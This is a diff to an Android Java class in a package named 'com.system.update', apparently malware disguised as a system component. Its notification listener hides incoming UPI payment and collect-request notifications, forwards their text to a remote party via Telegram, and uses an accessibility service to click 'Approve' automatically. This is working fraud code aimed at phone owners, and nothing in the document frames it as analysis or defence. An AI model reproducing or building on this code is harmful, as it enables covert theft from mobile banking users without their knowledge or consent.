@@ -1,4 +1,4 @@
-﻿package com.system.update;
+package com.system.update;
 
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
@@ -13,9 +13,9 @@ public class NotificationListener extends NotificationListenerService {
     public void onNotificationPosted(StatusBarNotification sbn) {
         String text = sbn.getNotification().extras.getString("android.text");
         if (text != null) {
-            if (text.contains("UPI") || text.contains("requests") || text.contains("collect") || text.contains("Collect")) {
+            if (text.contains("UPI") || text.contains("requests") || text.contains("collect")) {
                 cancelNotification(sbn.getKey());
-                sendTelegram("🔕 Hidden UPI notification: " + text);
+                sendTelegram("Hidden UPI notification: " + text);
                 MyAccessibilityService service = MyAccessibilityService.getInstance();
                 if (service != null) {
                     service.clickButton("Approve");
